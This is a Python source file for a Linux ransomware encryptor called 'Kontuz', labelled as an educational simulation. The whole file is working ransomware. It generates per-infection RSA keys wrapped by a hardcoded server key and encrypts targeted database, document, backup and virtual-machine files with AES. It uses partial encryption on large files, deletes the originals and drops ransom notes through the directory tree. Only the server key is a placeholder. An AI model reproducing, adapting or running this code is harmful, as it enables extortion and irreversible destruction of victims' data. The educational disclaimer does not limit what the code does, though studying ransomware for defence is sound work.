#!/usr/bin/env python3
"""
---------------------------------------------------------------------------
Linux Encryptor "Kontuz" @4quarks
---------------------------------------------------------------------------
Summary:
Encryptor script for Linux ransomware simulation using AES + RSA 

Key Features:
- Hybrid encryption scheme: symmetric (AES-256-CTR) + asymmetric (RSA)
- Client keypair generated on the fly per infection
- Server public key is hardcoded and used to encrypt the client's private key
- AES keys are generated per file and encrypted with the client's public key
- No network communication required during encryption phase

Dependencies:  
pip install cryptography

Warning:
- This code is for for educational and authorized use only. Do not use on 
  systems you do not own or have explicit permission to operate on.
"""

import os
import argparse
import secrets
from pathlib import Path

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding

# Constants
MARKER = b"KONTUZ"     # Tag to identify files encrypted
EXTENSION = ".kontuz"  # Extension of the encrypted files
CHUNK_SIZE = 100_000   # Size encrypted blokc i.e. 100 KB
MIN_SIZE = 261         # Ignore smaller files

# Server's public key (hardcoded in malware)
SERVER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

# Ransom note details
RANSOM_NOTE_FILE = "README_Kontuz.txt"
RANSOM_NOTE_TEXT = (
    "Your files have been encrypted using hybrid encryption (AES + RSA).\n"
    "Contact the instructor for decryption instructions."
)

# Directories to skip during encryption
SKIP_DIRS = (
    "/boot", "/dev", "/etc", "/lib", "/proc", "/run", "/srv", "/sys", "/usr", "/var", "/tmp/.mount", "/snap"
)

# File extensions targeted for encryption
TARGET_EXT = {
    ".3ds", ".4dl", ".7z", ".abcddb", ".abs", ".abx", ".accdb", ".accdc",
    ".accde", ".accdr", ".accdt", ".accdw", ".accft", ".adb", ".ade", ".adf",
    ".adp", ".aif", ".arc", ".ary", ".ask", ".avd", ".back",
    ".bitmap", ".btr", ".bundle", ".c", ".cad", ".cat", ".cdb", ".cer",
    ".ckp", ".cma", ".cpd", ".cpp", ".cs", ".ctl", ".cxx", ".dacpac",
    ".dad", ".dadiagrams", ".daschema", ".db", ".db3", ".dbc", ".dbf", ".dbs",
    ".dbt", ".dbv", ".dbx", ".dcb", ".dct", ".ddl", ".dex", ".dib",
    ".disk", ".dlis", ".doc", ".docx", ".dpl", ".dsk", ".dsn", ".dtsx",
    ".dwg", ".dxl", ".eco", ".ecx", ".edb", ".eml", ".epim", ".exb",
    ".fcd", ".fdb", ".fic", ".fmp", ".fmpi2", ".fmpsl", ".fms", ".fp3",
    ".fp4", ".fp7", ".fps", ".fpt", ".frm", ".gdb", ".grdb", ".gwi",
    ".gzip", ".hdb", ".his", ".ib", ".idb", ".idx", ".ihx", ".itdb",
    ".itw", ".jfif", ".jpe", ".kdb", ".kdbx", ".kexi", ".kexic", ".kexis",
    ".lgc", ".lut", ".lwx", ".maf", ".mag", ".mail", ".mar", ".mas",
    ".mav", ".maw", ".mdb", ".mdf", ".mdn", ".mdt", ".mp4", ".mpd",
    ".msg", ".mud", ".myd", ".ndf", ".nnt", ".nrg", ".nrmlib", ".ns2",
    ".ns3", ".ns4", ".nsf", ".nv", ".nv2", ".nwdb", ".nyf",
    ".odb", ".odc", ".odf", ".odg", ".odi", ".odm", ".odp", ".ogy",
    ".ora", ".orx", ".ost", ".ova", ".ovf", ".owc", ".p7b", ".p7c",
    ".pack", ".pdf", ".pfx", ".pmf", ".ppt", ".pptx", ".qcow", ".rar",
    ".rbf", ".rctd", ".rev", ".rm", ".rod", ".rodx", ".rpd", ".rsd",
    ".rtf", ".sample", ".sas7bdat", ".sbf", ".scx", ".sdc", ".sdf", ".sqlite",
    ".sqlite3", ".sqlitedb", ".tar", ".te", ".temx", ".tib", ".tiff", ".tmd",
    ".tps", ".tre", ".trm", ".udb", ".usr"
}

TARGET_EXT_BIG = {
    ".avdx", ".avhd", ".bin", ".nvram", ".pvm", ".raw", ".subvol", ".vhd",
    ".vhdx", ".vmc", ".vmcx", ".vmdk", ".vmem", ".vmrs", ".vmsd", ".vmsn",
    ".vmxf", ".vmx", ".vsv", ".vbox", ".vbs", ".vcb", ".vdi", ".vfd", ".v12",
    ".vmss", ".vmtm", ".vsdx", ".vswp", ".xld", ".xls", ".xlsx", ".xmlff",
    ".war", ".wdb", ".wmdb", ".wmv", ".work", ".wps", ".wrk", ".xdb", ".xvd"
}

# Load server's public RSA key for encrypting the client private key
server_public_key = serialization.load_pem_public_key(
    SERVER_PUBLIC_KEY_PEM, backend=default_backend()
)

# Determine if path should be skipped (critical system directories)
def should_skip_path(path):
    return any(str(path).startswith(p) for p in SKIP_DIRS)

# Check if the file is eligible for encryption
def should_process_file(path):
    if (
        not path.is_file()                       # Skip if it's not a regular file
        or path.stat().st_size < MIN_SIZE        # Skip if file is too small
        or path.suffix.endswith(EXTENSION)       # Skip if it's already encrypted
        or path.suffix.lower() not in TARGET_EXT # Skip if it's not a target extension
    ):
        return False
    try:
        with path.open("rb") as f:
            if f.read(len(MARKER)) == MARKER:
                return False
    except OSError:
        return False
    return True

# Encrypt a data chunk using AES-CTR mode
def encrypt_chunk(data, key, nonce):
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# Encrypt a single file with generated AES key and RSA-encrypted AES key
def encrypt_file(path, cpub_key, dry_run=False):
    size = path.stat().st_size
    dest = path.with_suffix(path.suffix + EXTENSION)

    if dry_run:
        print(f"[DRY-RUN] Would encrypt {path} → {dest}")
        return

    data = path.read_bytes()
    aes_key = secrets.token_bytes(32)  # generate 256-bit AES key
    nonce = secrets.token_bytes(16)    # generate 128-bit nonce for CTR mode

    # Select partial or full encryption depending on file size
    if size < 1_048_576:
        enc = encrypt_chunk(data, aes_key, nonce)
    elif size < 4_194_304:
        enc = encrypt_chunk(data[:CHUNK_SIZE], aes_key, nonce) + data[CHUNK_SIZE:]
    else:
        offset = size // 3
        enc = (
            data[:offset] +
            encrypt_chunk(data[offset : offset + CHUNK_SIZE], aes_key, nonce) +
            data[offset + CHUNK_SIZE:]
        )

    # Encrypt the AES key using the client's public RSA key
    enc_key = cpub_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )

    # Save encrypted file: marker + nonce + enc_key + data
    dest.write_bytes(MARKER + nonce + enc_key + enc)
    path.unlink(missing_ok=True)
    print(f"Encrypted {path.relative_to(Path.cwd())}")

# Drop a ransom note in the directory if not already present
def drop_ransom_note(directory, dry_run=False):
    note_path = directory / RANSOM_NOTE_FILE
    if note_path.exists():
        return
    if dry_run:
        print(f"[DRY-RUN] Would write ransom note in {directory}")
        return
    note_path.write_text(RANSOM_NOTE_TEXT)

# Walk through the directory tree and encrypt eligible files
def traverse(start_path, cpub_key, dry_run=False):
    for root, dirs, files in os.walk(start_path):
        root_path = Path(root)
        if should_skip_path(root_path):
            dirs[:] = []
            continue
        for fname in files:
            fpath = root_path / fname
            if should_process_file(fpath):
                encrypt_file(fpath, cpub_key, dry_run)
        drop_ransom_note(root_path, dry_run)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--path", default=os.getcwd(), help="Directory to encrypt")
    parser.add_argument("--enc-client-key", default="client_privkey.encrypted", help="Path to encrypted client private key")
    parser.add_argument("--dry-run", action="store_true", help="Preview only")
    args = parser.parse_args()

    path = Path(args.path).resolve()
    if not path.exists():
        print("Error: Path does not exist")
        return

    # Generate RSA keypair for this infection
    print("Generating RSA key pair...")
    cpriv_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    cpub_key = cpriv_key.public_key()

    # Serialize client private key to bytes
    cpriv_bytes = cpriv_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Hybrid encryption of the private key using AES + RSA
    privkey_aes_key = secrets.token_bytes(32)  # AES key
    privkey_iv = secrets.token_bytes(16)       # IV for CBC mode

    # Pad and encrypt the private key with AES-CBC
    padder = sym_padding.PKCS7(128).padder()
    padded_privkey = padder.update(cpriv_bytes) + padder.finalize()

    cipher = Cipher(algorithms.AES(privkey_aes_key), modes.CBC(privkey_iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_privkey_data = encryptor.update(padded_privkey) + encryptor.finalize()

    # Encrypt the AES key with the server's public RSA key
    encrypted_privkey_key = server_public_key.encrypt(
        privkey_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Write encrypted private key data to file
    Path(args.enc_client_key).write_bytes(privkey_iv + encrypted_privkey_key + encrypted_privkey_data)

    print("Starting encryption...")
    traverse(path, cpub_key, dry_run=args.dry_run)
    print("Done.")

if __name__ == "__main__":
    main()
